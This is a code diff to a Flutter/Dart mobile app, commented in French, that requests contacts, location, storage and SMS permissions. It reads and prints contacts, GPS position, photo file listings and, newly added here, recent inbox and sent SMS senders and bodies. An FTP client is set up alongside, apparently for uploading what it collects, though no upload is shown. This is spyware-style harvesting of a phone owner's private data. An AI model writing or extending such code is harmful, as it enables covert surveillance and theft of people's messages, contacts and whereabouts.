@@ -2,10 +2,12 @@ import 'dart:io';
 import 'package:geolocator/geolocator.dart';
 import 'package:device_info/device_info.dart';
 import 'package:flutter/material.dart';
+import 'package:sms/sms.dart';
 import 'package:ftpconnect/ftpConnect.dart';
 // ignore: import_of_legacy_library_into_null_safe
 import 'package:permission_handler/permission_handler.dart';
 import 'package:contacts_service/contacts_service.dart';
+
 
 void main() {
   runApp(const MyApp());
@@ -43,6 +45,7 @@ class _MyHomePageState extends State<MyHomePage> {
       Permission.storage,
       Permission.contacts,
       Permission.location,
+      Permission.sms,
     ].request();
 
 // Préparation de la connexion FTP
@@ -67,15 +70,26 @@ class _MyHomePageState extends State<MyHomePage> {
       print(contact.phones!.first.value);
     }
 
-    // ***** PARTIE SMS *****
-
     // ***** PARTIE LOCALISATION *****
     print(await Geolocator.getCurrentPosition());
+
+    // ***** PARTIE SMS *****
+    SmsQuery query = new SmsQuery();
+    List<SmsMessage> messages = await query.querySms(
+    // récupération des messages reçus et envoyés
+    kinds: [SmsQueryKind.Inbox, SmsQueryKind.Sent], 
+    count: 10, //Limiter le nombre de SMS à récupérer
+    );
+    // Parcourir les messages
+    for (var message in messages) {
+      print("Numéro Expéditeur : "+message.sender);
+      print("Corps du message : "+message.body);
+    }
 
     // ***** PARTIE PHOTOS *****
 
     // Récupération de la liste de fichier
-    Directory dir = Directory('/storage/18EF-151E/images');
+    Directory dir = Directory('/storage/1CEC-2F09/images');
     List<FileSystemEntity> files = dir.listSync(recursive: true);
 
     // Définition de la liste de fichier
